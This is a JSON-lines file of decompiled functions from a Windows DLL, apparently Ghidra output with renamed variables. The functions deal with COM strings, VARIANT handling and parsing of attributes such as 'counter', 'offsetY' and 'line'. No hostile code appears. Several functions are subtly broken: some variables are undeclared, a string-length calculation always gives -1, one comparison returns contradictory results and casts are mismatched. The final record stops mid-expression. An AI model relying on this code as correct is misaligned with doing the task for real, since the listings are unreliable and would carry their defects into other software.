{"Function Name": "FUN_10007ba0", "Address": "10007ba0", "Source Code": "void __fastcall FUN_10007ba0(wchar_t *inputString1,wchar_t *inputString2,char *inputString3)\n{\n    uint *unsignedIntPtr; \n    unsignedIntPtr = (uint *)FUN_10007b90(); \n    \n    \n    \n    \n    \n    \n    \n    \n    ___stdio_common_vswscanf(*unsignedIntPtr | 1, unsignedIntPtr[1], inputString1, 0xffffffff, inputString2, 0, inputString3);\n}"}
{"Function Name": "FUN_10007bf0", "Address": "10007bf0", "Source Code": "void __cdecl FUN_10007bf0(DWORD exception_code, DWORD exception_flags)\n{\n    \n    RaiseException(exception_code, exception_flags, 0, NULL);\n}"}
{"Function Name": "FUN_10007c20", "Address": "10007c20", "Source Code": "void FUN_10007c20(undefined4 input_param)\n{\n    code *function_pointer; \n    FUN_10007c10(&input_param, input_param); \n    __CxxThrowException_8(NULL, &DAT_1004c6e0); \n    function_pointer = (code *)swi(3); \n    (*function_pointer)(); \n    return; \n}"}
{"Function Name": "FUN_10007c40", "Address": "10007c40", "Source Code": "uint __fastcall FUN_10007c40(LPCRITICAL_SECTION criticalSection)\n{\n    \n    if (InitializeCriticalSectionEx(criticalSection, 0, 0) == 0) {\n        \n        uint lastErrorCode = GetLastError();\n        \n        if (0 < (int)lastErrorCode) {\n            \n            return lastErrorCode & 0xffff | 0x80070000;\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_10007c70", "Address": "10007c70", "Source Code": "void __thiscall FUN_10007c70(void *this, LPCSTR inputString)\n{\n    int wideCharCount; \n    BSTR wideCharString; \n    int conversionResult; \n    uint securityCookie; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (inputString != (LPCSTR)0x0) { \n        wideCharCount = MultiByteToWideChar(3, 0, inputString, -1, (LPWSTR)0x0, 0); \n        wideCharString = SysAllocStringLen((OLECHAR *)0x0, wideCharCount - 1); \n        \n        if (wideCharString != (BSTR)0x0) { \n            conversionResult = MultiByteToWideChar(3, 0, inputString, -1, wideCharString, wideCharCount); \n            if (conversionResult == wideCharCount) { \n                goto LAB_10007cec; \n            } else {\n                SysFreeString(wideCharString); \n                FUN_1000b490((void *)0x0); \n            }\n        }\n    }\n    \n    FUN_10007c20(0x8007000e); \n    code *systemCallAddress = (code *)swi(3); \n    (*systemCallAddress)(); \n    return; \nLAB_10007cec: \n    VarBstrCmp(*this, wideCharString, 0x400, 0); \n    SysFreeString(wideCharString); \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_10007d30", "Address": "10007d30", "Source Code": "void __fastcall FUN_10007d30(BSTR *bstrStringPointer)\n{\n    \n    SysFreeString(*bstrStringPointer);\n}"}
{"Function Name": "FUN_10008010", "Address": "10008010", "Source Code": "LPCWSTR __fastcall FUN_10008010(int *inputParam) \n{\n    LPCWSTR *stringPointer = (LPCWSTR *)*inputParam; \n    if (stringPointer && stringPointer[1] == (LPCWSTR)0x0) { \n        stringPointer[1] = (LPCWSTR)convertBSTRToString(*stringPointer); \n    }\n    return stringPointer ? stringPointer[1] : (LPCWSTR)0x0; \n}"}
{"Function Name": "FUN_10008030", "Address": "10008030", "Source Code": "bool __thiscall FUN_10008030(void *this, undefined4 *param_1)\n{\n    BSTR *firstBSTR = *this; \n    BSTR *secondBSTR = (BSTR *)*param_1; \n    UINT minLength, firstLength, secondLength; \n    BSTR currentChar; \n    \n    if (firstBSTR != secondBSTR) {\n        \n        if (firstBSTR == (BSTR *)0x0) {\n            \n            if (secondBSTR != (BSTR *)0x0 && *secondBSTR != (BSTR)0x0 && (minLength = SysStringLen(*secondBSTR), minLength != 0)) {\n                return false; \n            }\n        } else {\n            \n            if (secondBSTR != (BSTR *)0x0) {\n                firstLength = SysStringLen(*firstBSTR); \n                secondLength = SysStringLen(*secondBSTR); \n                minLength = (secondLength < firstLength) ? secondLength : firstLength; \n                \n                if (minLength != 0) {\n                    currentChar = *firstBSTR; \n                    do {\n                        \n                        if (*currentChar != *(OLECHAR *)(((int)*secondBSTR - (int)*firstBSTR) + (int)currentChar)) {\n                            return *currentChar == *(OLECHAR *)(((int)*secondBSTR - (int)*firstBSTR) + (int)currentChar); \n                        }\n                        currentChar++; \n                    } while (--minLength != 0); \n                }\n                return firstLength == secondLength; \n            }\n            \n            if (*firstBSTR != (BSTR)0x0 && (minLength = SysStringLen(*firstBSTR), minLength != 0)) {\n                return false; \n            }\n        }\n    }\n    return true; \n}"}
{"Function Name": "FUN_10008170", "Address": "10008170", "Source Code": "void __fastcall FUN_10008170(VARIANTARG *variantArg)\n{\n    \n    VariantClear(variantArg);\n}"}
{"Function Name": "FUN_10008180", "Address": "10008180", "Source Code": "void __thiscall FUN_10008180(void *object, VARIANTARG *variantParam)\n{\n    HRESULT result; \n    VARIANTARG variantArg; \n    *(undefined4 *)object = 0; \n    if ((variantParam->n1).n2.vt == 8) { \n        FUN_10007ef0(object, *(OLECHAR **)((int)&variantParam->n1 + 8)); \n    } else {\n        VariantInit(&variantArg); \n        result = VariantChangeType(&variantArg, variantParam, 0, 8); \n        if (result < 0) { \n            _com_issue_error(result); \n            return; \n        }\n        FUN_10007ef0(object, (OLECHAR *)variantArg.n1._8_4_); \n        VariantClear(&variantArg); \n    }\n    return; \n}"}
{"Function Name": "FUN_10008240", "Address": "10008240", "Source Code": "void __fastcall FUN_10008240(int **param_1, void *param_2)\n{\n    BSTR *bstrPointer1; \n    BSTR *bstrPointer2; \n    BSTR bstrTemp;   \n    code *functionPointer;  \n    void **voidPointerPtr; \n    int *intPointer1;   \n    int *intPointer2;   \n    undefined4 undefinedValue; \n    VARIANTARG *variantArgPointer; \n    undefined8 *undefinedPointer1; \n    undefined8 *undefinedPointer2; \n    VARIANTARG localVariantArg1; \n    void *localVoidPointer1; \n    BSTR *localBstrPointer; \n    VARIANTARG localVariantArg2; \n    int *localIntPointer; \n    void **localVoidPointer2; \n    uint localUnsignedInt; \n    void *localVoidPointer3; \n    localVoidPointer3 = ExceptionList; \n    localUnsignedInt = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    voidPointerPtr = &localVoidPointer3; \n    localIntPointer = (int *)0x0; \n    intPointer2 = *param_1; \n    ExceptionList = voidPointerPtr; \n    if (intPointer2 == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n    } else {\n        voidPointerPtr = (void **)(**(code **)(*intPointer2 + 0x44))(intPointer2, &localIntPointer, localUnsignedInt); \n        if ((int)voidPointerPtr < 0) { \n            goto LAB_100085ac; \n        }\n        localVoidPointer2 = (void **)0x0; \n        if (localIntPointer == (int *)0x0) { \n            _com_issue_error(-0x7fffbffd); \n        }\n        functionPointer = *(code **)(*localIntPointer + 0x1c); \n        intPointer1 = FUN_10007d40(&localBstrPointer, \"name\"); \n        undefinedValue = *(undefined4 *)*intPointer1 == (undefined4 *)0x0 ? 0 : *(undefined4 *)*intPointer1; \n        if ((*functionPointer)(intPointer2, undefinedValue, &localVoidPointer2) < 0) { \n            goto LAB_1000859b; \n        }\n        if (localBstrPointer != (BSTR *)0x0) { \n            LOCK(); \n            bstrPointer1 = localBstrPointer + 2; \n            bstrTemp = *bstrPointer1; \n            *bstrPointer1 = (BSTR)((int)*bstrPointer1 - 1); \n            UNLOCK(); \n            if (bstrTemp == (BSTR)0x1) { \n                if (*localBstrPointer != (BSTR)0x0) { \n                    SysFreeString(*localBstrPointer); \n                    *localBstrPointer = (BSTR)0x0; \n                }\n                if (localBstrPointer[1] != (BSTR)0x0) { \n                    thunk_FUN_1001dc78(localBstrPointer[1]); \n                    localBstrPointer[1] = (BSTR)0x0; \n                }\n                FUN_10013ceb(localBstrPointer); \n            }\n        }\n        if (localVoidPointer2 == (void **)0x0) { \n            goto LAB_100085f2; \n        }\n        if ((**(code **)((int)*localVoidPointer2 + 0x20))(localVoidPointer2, &localVariantArg2) < 0) { \n            goto LAB_1000859b; \n        }\n        VariantInit(&localVariantArg1); \n        if ((int)VariantCopy(&localVariantArg1, &localVariantArg2) < 0) { \n            goto LAB_100085fc; \n        }\n        intPointer2 = (int *)FUN_10008180(&localBstrPointer, &localVariantArg1); \n        undefinedPointer2 = *(undefined8 **)(undefined4 *)*intPointer2; \n        do {\n            sVar4 = *(short *)undefinedPointer2; \n            undefinedPointer2 = (undefined8 *)((int)undefinedPointer2 + 2); \n        } while (sVar4 != 0); \n        FUN_1000b690(localVoidPointer1, *(undefined8 **)(undefined4 *)*intPointer2, (void *)((int)undefinedPointer2 - ((int)undefinedPointer2 + 2) >> 1)); \n        if (localBstrPointer != (BSTR *)0x0) { \n            LOCK(); \n            bstrPointer2 = localBstrPointer + 2; \n            bstrTemp = *bstrPointer2; \n            *bstrPointer2 = (BSTR)((int)*bstrPointer2 - 1); \n            UNLOCK(); \n            if (bstrTemp == (BSTR)0x1) { \n                if (*localBstrPointer != (BSTR)0x0) { \n                    SysFreeString(*localBstrPointer); \n                    *localBstrPointer = (BSTR)0x0; \n                }\n                if (localBstrPointer[1] != (BSTR)0x0) { \n                    thunk_FUN_1001dc78(localBstrPointer[1]); \n                    localBstrPointer[1] = (BSTR)0x0; \n                }\n                FUN_10013ceb(localBstrPointer); \n            }\n        }\n        VariantClear(&localVariantArg1); \n        if (localIntPointer != (int *)0x0) { \n            functionPointer = *(code **)(*localIntPointer + 0x1c); \n            intPointer1 = FUN_10007d40(&localBstrPointer, \"value\"); \n            undefinedValue = *(undefined4 *)*intPointer1 == (undefined4 *)0x0 ? 0 : *(undefined4 *)*intPointer1; \n            if ((*functionPointer)(intPointer2, undefinedValue, &localVoidPointer2) < 0) { \n                goto LAB_1000859b; \n            }\n            if (localBstrPointer != (BSTR *)0x0) { \n                LOCK(); \n                bstrPointer1 = localBstrPointer + 2; \n                bstrTemp = *bstrPointer1; \n                *bstrPointer1 = (BSTR)((int)*bstrPointer1 - 1); \n                UNLOCK(); \n                if (bstrTemp == (BSTR)0x1) { \n                    if (*localBstrPointer != (BSTR)0x0) { \n                        SysFreeString(*localBstrPointer); \n                        *localBstrPointer = (BSTR)0x0; \n                    }\n                    if (localBstrPointer[1] != (BSTR)0x0) { \n                        thunk_FUN_1001dc78(localBstrPointer[1]); \n                        localBstrPointer[1] = (BSTR)0x0; \n                    }\n                    FUN_10013ceb(localBstrPointer); \n                }\n            }\n            if (localVoidPointer2 != (void **)0x0) { \n                if ((**(code **)((int)*localVoidPointer2 + 0x20))(localVoidPointer2, &local_3c) < 0) { \n                    goto LAB_1000859b; \n                }\n                variantArgPointer = FUN_10008140(&localVariantArg1, &local_3c); \n                intPointer2 = (int *)FUN_10008180(&localBstrPointer, variantArgPointer); \n                undefinedPointer2 = *(undefined8 **)(undefined4 *)*intPointer2; \n                do {\n                    sVar4 = *(short *)undefinedPointer2; \n                    undefinedPointer2 = (undefined8 *)((int)undefinedPointer2 + 2); \n                } while (sVar4 != 0); \n                FUN_1000b690((void *)((int)localVoidPointer1 + 0x18), *(undefined8 **)(undefined4 *)*intPointer2, (void *)((int)undefinedPointer2 - ((int)undefinedPointer2 + 2) >> 1)); \n                if (localBstrPointer != (BSTR *)0x0) { \n                    LOCK(); \n                    bstrPointer2 = localBstrPointer + 2; \n                    bstrTemp = *bstrPointer2; \n                    *bstrPointer2 = (BSTR)((int)*bstrPointer2 - 1); \n                    UNLOCK(); \n                    if (bstrTemp == (BSTR)0x1) { \n                        if (*localBstrPointer != (BSTR)0x0) { \n                            SysFreeString(*localBstrPointer); \n                            *localBstrPointer = (BSTR)0x0; \n                        }\n                        if (localBstrPointer[1] != (BSTR)0x0) { \n                            thunk_FUN_1001dc78(localBstrPointer[1]); \n                            localBstrPointer[1] = (BSTR)0x0; \n                        }\n                        FUN_10013ceb(localBstrPointer); \n                    }\n                }\n                VariantClear(&localVariantArg1); \n            }\n        }\n    }\nLAB_1000859b: \n    if (localIntPointer != (int *)0x0) { \n        (**(code **)(*localIntPointer + 8))(localIntPointer); \n    }\nLAB_100085ac: \n    ExceptionList = localVoidPointer3; \n    ___security_check_cookie_4(localUnsignedInt ^ (uint)&stack0xfffffffc); \n    return; \nLAB_100085f2: \n    _com_issue_error(-0x7fffbffd); \nLAB_1000860c: \n    _com_issue_error(-0x7fffbffd); \n    return; \n}"}
{"Function Name": "FUN_10008620", "Address": "10008620", "Source Code": "void __fastcall FUN_10008620(int **int_pointer_ptr, void *void_pointer)\n{\n    int *int_pointer; \n    code *code_function_pointer; \n    float *float_pointer; \n    char char_variable; \n    int integer_variable_1; \n    int integer_variable_2; \n    HRESULT HRESULT_variable; \n    undefined8 *undefined_pointer; \n    code *unused_EBX_register; \n    BSTR unused_BSTR_variable; \n    float *local_float_pointer_array[2]; \n    void *local_void_pointer; \n    uint local_unsigned_integer_1; \n    undefined8 *local_undefined_pointer; \n    void *local_void_pointer_2; \n    uint local_unsigned_integer_2; \n    BSTR local_BSTR_variable; \n    int *local_integer_pointer; \n    uint local_unsigned_integer_3; \n    void *local_void_pointer_3; \n    undefined4 local_undefined_variable; \n    local_void_pointer_3 = ExceptionList; \n    local_unsigned_integer_3 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &local_void_pointer_3; \n    local_integer_pointer = (int *)0x0; \n    local_undefined_variable._0_1_ = 0; \n    local_undefined_variable._1_3_ = 0; \n    int_pointer = *int_pointer_ptr; \n    local_void_pointer = void_pointer; \n    if (int_pointer == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n        (*unused_EBX_register)(unused_BSTR_variable); \n        FUN_10007c20(0x8007000e); \n        FUN_1001dea6(); \n        code_function_pointer = (code *)swi(3); \n        (*code_function_pointer)(); \n        return; \n    }\n    local_undefined_variable = 0; \n    (**(code **)(*int_pointer + 0x34))(int_pointer, &local_integer_pointer, local_unsigned_integer_3); \n    unused_EBX_register = SysFreeString_exref; \n    if (local_integer_pointer == (int *)0x0) { \n        local_undefined_variable = 0xc; \n        if (local_integer_pointer != (int *)0x0) { \n            (**(code **)(*local_integer_pointer + 8))(local_integer_pointer); \n        }\n        ExceptionList = local_void_pointer_3; \n        ___security_check_cookie_4(local_unsigned_integer_3 ^ (uint)&stack0xfffffffc); \n        return; \n    }\n    local_BSTR_variable = (BSTR)0x0; \n    local_undefined_variable._1_3_ = (undefined3)((uint)local_undefined_variable >> 8); \n    local_undefined_variable._0_1_ = 2; \n    integer_variable_1 = (**(code **)(*local_integer_pointer + 0x1c))(local_integer_pointer, &local_BSTR_variable); \n    if (integer_variable_1 < 0) { \n        SysFreeString(local_BSTR_variable); \n        goto LAB_10008912; \n    }\n    integer_variable_1 = MultiByteToWideChar(3, 0, \"counter\", -1, (LPWSTR)0x0, 0); \n    unused_BSTR_variable = SysAllocStringLen((OLECHAR *)0x0, integer_variable_1 - 1); \n    if (unused_BSTR_variable == (BSTR)0x0) goto LAB_1000891f; \n    integer_variable_2 = MultiByteToWideChar(3, 0, \"counter\", -1, unused_BSTR_variable, integer_variable_1); \n    if (integer_variable_2 != integer_variable_1) goto LAB_1000891c; \n    HRESULT_variable = VarBstrCmp(local_BSTR_variable, unused_BSTR_variable, 0x400, 0); \n    SysFreeString(unused_BSTR_variable); \n    if (HRESULT_variable == 1) { \n        local_void_pointer_2 = (void *)0x0; \n        local_unsigned_integer_2 = 7; \n        local_unsigned_integer_1 = 7; \n        local_undefined_variable = CONCAT31(local_undefined_variable._1_3_, 4); \n        char_variable = FUN_10008240(&local_integer_pointer, local_50); \n        if (char_variable != '\\0') { \n            FUN_1000c720(local_void_pointer, local_float_pointer_array, (ushort **)local_50); \n            float_pointer = local_float_pointer_array[0]; \n            if ((undefined8 *)(local_float_pointer_array[0] + 8) != local_50) { \n                undefined_pointer = local_50; \n                if (7 < local_unsigned_integer_1) { \n                    undefined_pointer = (undefined8 *)local_50[0]; \n                }\n                FUN_1000b690(local_float_pointer_array[0] + 8, undefined_pointer, local_void_pointer_2); \n            }\n            if ((undefined8 **)(float_pointer + 0xe) != &local_undefined_pointer) { \n                undefined_pointer = (undefined8 *)&local_undefined_pointer; \n                if (7 < local_unsigned_integer_2) { \n                    undefined_pointer = local_undefined_pointer; \n                }\n                FUN_1000b690(float_pointer + 0xe, undefined_pointer, local_void_pointer_2); \n            }\n        }\n        local_undefined_variable._0_1_ = 2; \n        if (7 < local_unsigned_integer_2) { \n            undefined_pointer = local_undefined_pointer; \n            if ((0xfff < local_unsigned_integer_2 * 2 + 2) && \n                (undefined_pointer = *(undefined8 **)((int)local_undefined_pointer + -4), \n                0x1f < (uint)((int)local_undefined_pointer + (-4 - (int)undefined_pointer)))) goto LAB_10008929; \n            FUN_10013ceb(undefined_pointer); \n        }\n        local_void_pointer_2 = (void *)0x0; \n        local_unsigned_integer_2 = 7; \n        if (7 < local_unsigned_integer_1) { \n            undefined_pointer = (undefined8 *)local_50[0]; \n            if ((0xfff < local_unsigned_integer_1 * 2 + 2) && \n                (undefined_pointer = *(undefined8 **)((int)(undefined8 *)local_50[0] + -4), \n                0x1f < (uint)((int)(undefined8 *)local_50[0] + (-4 - (int)undefined_pointer)))) goto LAB_10008929; \n            FUN_10013ceb(undefined_pointer); \n        }\n    }\n    local_integer_pointer_2 = (int *)0x0; \n    local_undefined_variable._0_1_ = 5; \n    integer_variable_1 = (**(code **)(*local_integer_pointer + 0x40))(local_integer_pointer, &local_integer_pointer_2); \n    if (integer_variable_1 < 0) { \n        local_undefined_variable._0_1_ = 7; \n        if (local_integer_pointer_2 != (int *)0x0) { \n            (**(code **)(*local_integer_pointer_2 + 8))(local_integer_pointer_2); \n        }\n        goto LAB_10008906; \n    }\n    if (local_integer_pointer != local_integer_pointer_2) { \n        local_integer_pointer = local_integer_pointer_2; \n        local_undefined_variable._0_1_ = 10; \n        if (local_integer_pointer_2 != (int *)0x0) { \n            (**(code **)(*local_integer_pointer_2 + 4))(local_integer_pointer_2); \n        }\n        local_undefined_variable._0_1_ = 9; \n        if (int_pointer != (int *)0x0) { \n            (**(code **)(*int_pointer + 8))(int_pointer); \n        }\n    }\n    local_undefined_variable = CONCAT31(local_undefined_variable._1_3_, 0xb); \n    if (local_integer_pointer_2 != (int *)0x0) { \n        (**(code **)(*local_integer_pointer_2 + 8))(local_integer_pointer_2); \n    }\n    SysFreeString(local_BSTR_variable); \n}"}
{"Function Name": "FUN_10008930", "Address": "10008930", "Source Code": "void __fastcall FUN_10008930(void **inputArray)\n{\n    void *tempPointer; \n    code *functionPointer; \n    \n    if ((void *)0x7 < inputArray[0xb]) {\n        tempPointer = inputArray[6]; \n        \n        if ((0xfff < (int)inputArray[0xb] * 2 + 2U) &&\n            (tempPointer = *(void **)((int)tempPointer + -4), 0x1f < (uint)((int)inputArray[6] + (-4 - (int)tempPointer)))) {\n            goto LAB_100089c7; \n        }\n        FUN_10013ceb(tempPointer); \n    }\n    inputArray[10] = (void *)0x0; \n    inputArray[0xb] = (void *)0x7; \n    *(undefined2 *)(inputArray + 6) = 0; \n    \n    if ((void *)0x7 < inputArray[5]) {\n        tempPointer = *inputArray; \n        \n        if ((0xfff < (int)inputArray[5] * 2 + 2U) &&\n            (tempPointer = *(void **)((int)tempPointer + -4), 0x1f < (uint)((int)inputArray[0] + (-4 - (int)tempPointer)))) {\n            LAB_100089c7: \n            FUN_1001dea6(); \n            functionPointer = (code *)swi(3); \n            (*functionPointer)(); \n            return; \n        }\n        FUN_10013ceb(tempPointer); \n    }\n    inputArray[4] = (void *)0x0; \n    inputArray[5] = (void *)0x7; \n    *(undefined2 *)inputArray = 0; \n    return; \n}"}
{"Function Name": "FUN_10008c10", "Address": "10008c10", "Source Code": "void __fastcall FUN_10008c10(int input_param) \n{\n    process_data((int *)(input_param + 4)); \n}"}
{"Function Name": "FUN_10008c20", "Address": "10008c20", "Source Code": "void __fastcall FUN_10008c20(int **param_1,int *param_2)\n{\n    int **pointerToArrayOfIntPointers1; \n    int returnValue; \n    int **pointerToArrayOfIntPointers2; \n    int *firstIntegerPointer; \n    BSTR bstrVariable; \n    int loopCounter; \n    VARIANTARG variantArg1; \n    VARIANTARG variantArg2; \n    int itemCount; \n    int **resultPointer1; \n    int **resultPointer2; \n    void *exceptionHandler; \n    undefined4 undefinedVariable; \n    exceptionHandler = ExceptionList; \n    ExceptionList = &exceptionHandler; \n    resultPointer2 = (int **)0x0; \n    undefinedVariable._0_1_ = 0; \n    firstIntegerPointer = *param_1; \n    if (firstIntegerPointer == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n    } else {\n        returnValue = (**(code **)(*firstIntegerPointer + 0x44))(firstIntegerPointer,&resultPointer2,0); \n        if (returnValue < 0) goto LAB_1000908a; \n        pointerToArrayOfIntPointers2 = resultPointer2; \n        if (resultPointer2 != (int **)0x0) { \n            returnValue = (*(code *)(*resultPointer2)[0xb])(resultPointer2,&itemCount); \n            if (returnValue < 0) goto LAB_1000908a; \n            resultPointer1 = (int **)0x0; \n            loopCounter = 0; \n            if (0 < itemCount) { \n                do {\n                    if (resultPointer2 == (int **)0x0) goto LAB_100090bc; \n                    BSTR bstrFromLocal28 = (BSTR)(*resultPointer2)[10]; \n                    if (resultPointer1 != (int **)0x0) { \n                        (*(code *)(*resultPointer1)[2])(resultPointer1); \n                    }\n                    resultPointer1 = (int **)0x0; \n                    returnValue = (*(code *)bstrFromLocal28)(pointerToArrayOfIntPointers1,loopCounter,&resultPointer1); \n                    if (returnValue < 0) goto LAB_10009058; \n                    int **resultPointer3 = (int **)0x0; \n                    if (resultPointer1 == (int **)0x0) goto LAB_100090bc; \n                    returnValue = (*(code *)(*resultPointer1)[7])(resultPointer1,&resultPointer3); \n                    if (returnValue < 0) {\n                        SysFreeString((BSTR)resultPointer3); \n                        goto LAB_10009058; \n                    }\n                    if (resultPointer1 == (int **)0x0) goto LAB_100090bc; \n                    returnValue = (*(code *)(*resultPointer1)[8])(resultPointer1,&variantArg1); \n                    if (returnValue < 0) goto LAB_10008edd; \n                    BSTR *resultPointer4 = (BSTR *)0x0; \n                    FUN_10007de0(&resultPointer4,(OLECHAR *)resultPointer3); \n                    VariantInit(&variantArg2); \n                    if (VariantCopy(&variantArg2,&variantArg1) < 0) goto LAB_100090d0; \n                    char local_4d = FUN_10008030(&resultPointer4,FUN_10007d40(&localBSTR2,\"offsetY\")); \n                    if (localBSTR2 != (BSTR *)0x0) { \n                        LOCK(); \n                        BSTR *bstrPointer1 = localBSTR2 + 2; \n                        bstrVariable = *bstrPointer1; \n                        *bstrPointer1 = (BSTR)((int)*bstrPointer1 + -1); \n                        UNLOCK(); \n                        if ((bstrVariable == (BSTR)0x1) && (localBSTR2 != (BSTR *)0x0)) { \n                            if (*localBSTR2 != (BSTR)0x0) { \n                                SysFreeString(*localBSTR2); \n                                *bstrPointer1 = (BSTR)0x0; \n                            }\n                            if (bstrPointer1[1] != (BSTR)0x0) { \n                                thunk_FUN_1001dc78(bstrPointer1[1]); \n                                bstrPointer1[1] = (BSTR)0x0; \n                            }\n                            FUN_10013ceb(bstrPointer1); \n                        }\n                        localBSTR2 = (BSTR *)0x0; \n                    }\n                    if (local_4d != '\\0') { \n                        firstIntegerPointer = (int *)FUN_10008180(&localBSTR1,&variantArg2); \n                        LPCWSTR _Str = (LPCWSTR *)*firstIntegerPointer; \n                        if (_Str == (LPCWSTR *)0x0) { \n                            _Str = (LPCWSTR)0x0; \n                        } else {\n                            if (_Str[1] == (LPCWSTR)0x0) { \n                                _Str = (LPCWSTR)ConvertBSTRToString(*_Str); \n                                _Str[1] = _Str; \n                            }\n                        }\n                        returnValue = FID_conflict__atoi((char *)_Str); \n                        *param_2 = returnValue; \n                        if (localBSTR1 != (BSTR *)0x0) { \n                            LOCK(); \n                            BSTR *bstrPointer2 = localBSTR1 + 2; \n                            bstrVariable = *bstrPointer2; \n                            *bstrPointer2 = (BSTR)((int)*bstrPointer2 + -1); \n                            UNLOCK(); \n                            if ((bstrVariable == (BSTR)0x1) && (localBSTR1 != (BSTR *)0x0)) { \n                                if (*localBSTR1 != (BSTR)0x0) { \n                                    SysFreeString(*localBSTR1); \n                                    *bstrPointer1 = (BSTR)0x0; \n                                }\n                                if (bstrPointer1[1] != (BSTR)0x0) { \n                                    thunk_FUN_1001dc78(bstrPointer1[1]); \n                                    bstrPointer1[1] = (BSTR)0x0; \n                                }\n                                FUN_10013ceb(bstrPointer1); \n                            }\n                            localBSTR1 = (BSTR *)0x0; \n                        }\n                    }\n                    VariantClear(&variantArg2); \n                    if (resultPointer4 != (BSTR *)0x0) { \n                        LOCK(); \n                        BSTR *bstrPointer2 = resultPointer4 + 2; \n                        bstrVariable = *bstrPointer2; \n                        *bstrPointer2 = (BSTR)((int)*bstrPointer2 + -1); \n                        UNLOCK(); \n                        if (bstrVariable == (BSTR)0x1) { \n                            if (*resultPointer4 != (BSTR)0x0) { \n                                SysFreeString(*resultPointer4); \n                                *bstrPointer1 = (BSTR)0x0; \n                            }\n                            if (bstrPointer1[1] != (BSTR)0x0) { \n                                thunk_FUN_1001dc78(bstrPointer1[1]); \n                                bstrPointer1[1] = (BSTR)0x0; \n                            }\n                            FUN_10013ceb(bstrPointer1); \n                        }\n                    }\n                    SysFreeString((BSTR)resultPointer3); \n                    loopCounter++; \n                } while (loopCounter < itemCount); \n            }\n            if (resultPointer1 != (int **)0x0) { \n                (*(code *)(*resultPointer1)[2])(resultPointer1); \n            }\n            goto LAB_1000908a; \n        }\n    }\n    _com_issue_error(-0x7fffbffd); \nLAB_100090d0:\n    _com_issue_error((long)pointerToArrayOfIntPointers2); \nLAB_100090d6:\n    _com_issue_error(-0x7fffbffd); \nLAB_100090e0:\n    SysFreeString(bstrVariable); \n    FUN_10007c20(0x8007000e); \n    return; \n}"}
{"Function Name": "FUN_10009100", "Address": "10009100", "Source Code": "void __fastcall FUN_10009100(int **int_pointer_ptr, void *void_pointer)\n{\n    int *integer_pointer; \n    code *function_pointer; \n    char character_variable; \n    int integer_variable; \n    BSTR wide_character_string; \n    int multi_byte_to_wide_char_result; \n    HRESULT HRESULT_variable; \n    void *pointer_variable; \n    BSTR unused_BSTR_variable; \n    undefined8 local_storage_undefined8[2]; \n    undefined4 local_storage_undefined4; \n    uint local_storage_unsigned_integer; \n    void *local_pointer_variable; \n    int *local_integer_pointer; \n    int *local_integer_pointer_2; \n    local_pointer_variable = ExceptionList; \n    local_storage_unsigned_integer = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &local_pointer_variable; \n    local_integer_pointer = (int *)0x0; \n    local_storage_undefined4._0_1_ = 0; \n    integer_pointer = *int_pointer_ptr; \n    if (integer_pointer == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n        SysFreeString(unused_BSTR_variable); \n        FUN_10007c20(0x8007000e); \n        FUN_1001dea6(); \n        function_pointer = (code *)swi(3); \n        (*function_pointer)(); \n        return; \n    }\n    local_storage_undefined4 = 0; \n    local_integer_pointer = (int *)0x0; \n    (**(code **)(*integer_pointer + 0x34))(integer_pointer, &local_integer_pointer, local_storage_unsigned_integer); \n    unused_BSTR_variable = (BSTR)SysFreeString_exref; \n    if (local_integer_pointer == (int *)0x0) { \n        local_storage_undefined4 = 0xd; \n        if (local_integer_pointer != (int *)0x0) { \n            (**(code **)(*local_integer_pointer + 8))(local_integer_pointer); \n        }\n        ExceptionList = local_pointer_variable; \n        ___security_check_cookie_4(local_storage_unsigned_integer ^ (uint)&stack0xfffffffc); \n        return; \n    }\n    BSTR local_BSTR = (BSTR)0x0; \n    local_storage_undefined4._1_3_ = (undefined3)((uint)local_storage_undefined4 >> 8); \n    local_storage_undefined4._0_1_ = 2; \n    integer_variable = (**(code **)(*local_integer_pointer + 0x1c))(local_integer_pointer, &local_BSTR); \n    if (integer_variable < 0) { \n        (*(code *)unused_BSTR_variable)(local_BSTR); \n        goto LAB_10009395; \n    }\n    integer_variable = MultiByteToWideChar(3, 0, \"line\", -1, (LPWSTR)0x0, 0); \n    wide_character_string = SysAllocStringLen((OLECHAR *)0x0, integer_variable - 1); \n    if (wide_character_string == (BSTR)0x0) goto LAB_100093f2; \n    multi_byte_to_wide_char_result = MultiByteToWideChar(3, 0, \"line\", -1, wide_character_string, integer_variable); \n    unused_BSTR_variable = wide_character_string; \n    if (multi_byte_to_wide_char_result != integer_variable) goto LAB_100093eb; \n    HRESULT_variable = VarBstrCmp(local_BSTR, wide_character_string, 0x400, 0); \n    unused_BSTR_variable = (BSTR)SysFreeString_exref; \n    SysFreeString(wide_character_string); \n    if (HRESULT_variable == 1) { \n        local_storage_undefined8[0]._0_4_ = (void *)((uint)(void *)local_storage_undefined8[0] & 0xffff0000); \n        FUN_1000b690(local_storage_undefined8, (undefined8 *)L\"Arial\", (void *)0x5); \n        local_storage_undefined4._0_1_ = 4; \n        character_variable = FUN_100094d0(&local_integer_pointer, (BSTR)local_storage_undefined8); \n        if (character_variable != '\\0') { \n            undefined4 *this = *(undefined4 **)((int)void_pointer + 4); \n            if (*(undefined4 **)((int)void_pointer + 8) == this) { \n                FUN_1000bd30(void_pointer, this, local_storage_undefined8); \n            } else {\n                FUN_1000c630(this, local_storage_undefined8); \n                *(undefined *)(this + 6) = (undefined)1; \n                *(undefined *)((int)this + 0x19) = 1; \n                this[7] = 0xffffff; \n                *(undefined8 *)(this + 8) = DAT_10048598; \n                FUN_1000c4a0(this + 10, &local_storage_34); \n                *(int *)((int)void_pointer + 4) = *(int *)((int)void_pointer + 4) + 0x38; \n            }\n        }\n    }\n    local_storage_undefined4._0_1_ = 2; \n    FUN_1000b610(&local_storage_34); \n    if (7 < local_storage_48) { \n        pointer_variable = (void *)local_storage_undefined8[0]; \n        if ((0xfff < local_storage_48 * 2 + 2) && (pointer_variable = *(void **)((int)(void *)local_storage_undefined8[0] + -4), 0x1f < (uint)((int)(void 